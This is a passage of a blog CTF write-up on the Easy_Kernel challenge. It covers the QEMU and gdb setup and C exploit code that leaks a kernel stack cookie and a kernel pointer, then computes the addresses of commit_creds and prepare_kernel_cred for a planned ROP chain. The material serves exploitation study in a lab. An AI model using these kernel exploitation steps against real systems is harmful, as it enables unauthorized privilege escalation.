<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd;font-style:italic">SCRIPT_DIR</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span> <span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span> dirname <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">BASH_SOURCE</span>[0]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span> &amp;&gt; /dev/null <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">pwd</span> <span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span>

/usr/bin/qemu-system-x86_64 <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -s <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-m 64M <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-cpu kvm64,+smep,+smap <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-kernel <span style="color:#8be9fd;font-style:italic">$SCRIPT_DIR</span>/bzImage <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-initrd <span style="color:#8be9fd;font-style:italic">$SCRIPT_DIR</span>/initramfs.cpio.gz <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-nographic <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-monitor none <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-append <span style="color:#f1fa8c">&#34;console=ttyS0 nokaslr quiet panic=1&#34;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>	-no-reboot
</code></pre></td></tr></table>
</div>
</div><p>Now <strong>qemu-system-x86_64</strong> is running in debug mode. You can attach to it using gdb
just run &ldquo;<strong>target remote :1234</strong>&rdquo; to attach to the kernel.</p>
<p>You can get the addresses of functions in the driver by greping &ldquo;<strong>/proc/kallsyms</strong>&rdquo;
if you don&rsquo;t have root access on the VM, all the addresses will be 0s. For getting the
addresses you must have root access</p>
<p>This is what you will see when you don&rsquo;t have root access.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kallsymswithoutroot.png"
    alt="without root"
    decoding="async"
  />
</div>
<p>This is what you will see when you have root access.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kallsymsroot.png"
    alt="root"
    decoding="async"
  />
</div>
<p>Now that we have the addresses and we also have disabled <strong>KASLR</strong>, we can easily debug the kernel.</p>
<p>For Leaking the stack cookie, we will use the sread function to read 0x400 bytes to us.
So, first let&rsquo;s set a breakpoint at sread.</p>
<p>I created a <strong>do_read()</strong> function which takes a buffer and number of bytes as argument and does the read syscall for you, and similarly other helper functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_read</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
    <span style="color:#ff79c6">return</span> read(fd, buffer, size);
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_ioctl</span>(<span style="color:#8be9fd">int</span> cmd, <span style="color:#8be9fd">int</span> arg){
    <span style="color:#ff79c6">return</span> ioctl(fd, cmd, arg);
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_write</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
    <span style="color:#ff79c6">return</span> write(fd, buffer, size);
}


<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
    
    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
    get_device(); <span style="color:#6272a4">/* opens the driver */</span>
    
    <span style="color:#6272a4">/* leak stack_cookie */</span>
    memset(exploit, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x1000</span>);
    do_read(exploit, <span style="color:#bd93f9">0x400</span>);

    telescope(exploit, <span style="color:#bd93f9">0x400</span>);
}
</code></pre></div>


<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sread_breakpoint.png"
    alt="breakpoint"
    decoding="async"
  />
</div>
<p>After setting the breakpoint, you can continue execution and run the exploit in the VM.</p>
<p>Once the breakpoint is hit, inspect the Kernel Stack to see if you can spot the stack cookie.
In the below screenshot you can see the stack cookie is placed on the stack.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/cookie.png"
    alt="cookie"
    decoding="async"
  />
</div>
<p>In this screenshot you can see the layout of the stack.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/stacklayout_sread.png"
    alt="stack layout for sread"
    decoding="async"
  />
</div>
<p>The <strong>telescope()</strong> function will print the leaked stack into hex format.
This is the output we get.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/telescope.png"
    alt="telescope"
    decoding="async"
  />
</div>
<p>So you can see we are able to leak the stack cookie at an offset of 0x80 and 0x70.
You can also see that we are able to leak a Kernel Pointer at offset 0x90, using this leak we can bypass <strong>KASLR</strong>.
We have disabled <strong>KASLR</strong> and hence for us the Kernel Base address is <strong>0xffffffff81000000</strong>
We can easily get the offset of this kernel pointer by subtracting the Kernel Base address from the leaked value and we get <strong>0x23e347</strong>, we can also calculate the address of some crucial functions like <strong>commit_creds</strong> and <strong>prepare_kernel_cred</strong>.
We will discuss more about these function when we will construct our ROP Chain.
So, we add this in our <strong>pwn()</strong> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#8be9fd">uint64_t</span> stack_cookie <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>exploit[<span style="color:#bd93f9">0x80</span>];
    <span style="color:#8be9fd">uint64_t</span> kernel_base  <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>exploit[<span style="color:#bd93f9">0x90</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x23e347</span>;
    <span style="color:#8be9fd">uint64_t</span> commit_creds <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x87e80</span>;
    <span style="color:#8be9fd">uint64_t</span> prepare_kernel_cred <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x881c0</span>;
    
    printf(<span style="color:#f1fa8c">&#34;[+] Stack Cookie : 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, stack_cookie);
    printf(<span style="color:#f1fa8c">&#34;[+] Kernel Base  : 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_base);
</code></pre></div>

<link href="/css/prism.css" rel="stylesheet"/>
<script src="/js/prism.js"></script>


        </div>



        <footer class="post-footer">
                
                
                
                <span class="post-categories">
                        <a href="https://x3ero0.github.io/categories/pwn/">Pwn</a>&emsp;
                        
                </span>
                
        
                
                
                
        </footer>
        
<table cellspacing="15" style="width:100%; border: none;">
    <tr>
        <td style="text-align: center; border: none; padding: 0px;">
        </td>
        <td style="text-align: center; border: none; padding: 0px;">
        </td>
    </tr>
</table>

        
    </article>

    

</main>


        <div class="sidebar1 widgets columns-1">

    <aside>
    
</aside>
    <aside class="widget widget_categories">
        <h2>Categories</h2>
        <ul class="widget__list"><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/crackmes/">Crackmes (7)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/ctf/">CTF (1)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/pwn/">Pwn (2)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/rev/">Rev (5)</a>
            </li>
        </ul>
    </aside>

    <aside class="widget widget_recent_entries">
        <h2>Recent Posts</h2>
        <ul>
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hyperion/">Hyperion Writeup</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/float-writeup/">Float Writeup</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hell86_from_ttlhacker/">Hell86 - ttlhacker</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/reversing_a_malware_in_disguise/">Reversing a malware in disguise</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/watevr_repyc/">Watevr_repyc</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
                    </li>
                
            
                
            
        </ul>
    </aside>

    <aside class="widget widget_recent_entries">
        <h2>Recent Posts</h2>
        <ul>
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hyperion/">Hyperion Writeup</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/float-writeup/">Float Writeup</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hell86_from_ttlhacker/">Hell86 - ttlhacker</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/reversing_a_malware_in_disguise/">Reversing a malware in disguise</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/watevr_repyc/">Watevr_repyc</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
                    </li>
                
            
                
            
        </ul>
    </aside>
</div>
        </div>
        </div>
<footer role="contentinfo" class="document-footer contentinfo widgets columns-1">

    <aside class="widget widget_text">
        <div class="textwidget">
            <p>Â© x3ero0&#39;s blog</p>
        </div>
    </aside>
</footer>
</div>

    </body>
</html>
